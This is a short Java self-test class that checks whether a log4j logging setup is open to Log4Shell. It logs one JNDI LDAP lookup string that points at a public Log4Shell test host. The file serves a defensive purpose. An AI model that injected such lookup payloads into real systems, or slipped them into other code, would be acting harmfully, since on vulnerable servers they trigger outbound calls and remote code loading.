/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.aspc.remote.util.misc.selftest;


import org.apache.log4j.ConsoleAppender;
//import org.apache.log4j.spi.LoggerFactory;
import org.apache.log4j.PatternLayout;
import org.apache.log4j.Level;
import org.apache.log4j.Logger;


/**
 *
 * @author nigel
 */
public class CheckLog4Shell {
//    private static final Logger logger=LogManager.getLogger( CheckLog4Shell.class);

    /**
     * The main for the program
     * 
     * @param args The command line arguments
     */
    public static void main( String[] args){
        Logger logger=Logger.getLogger( CheckLog4Shell.class);

        ConsoleAppender console = new ConsoleAppender(); //create appender
        console.setLayout(new PatternLayout("%d [%p|%c|%C{1}] %m%n"));
        console.setThreshold(Level.INFO);
        console.activateOptions();
        Logger.getRootLogger().addAppender(console);

        logger.error( "${jndi:ldap://log4shell.huntress.com:1389/6ca9d3ce-e0f3-451b-bcba-daafe792f7d4}");
    }
}
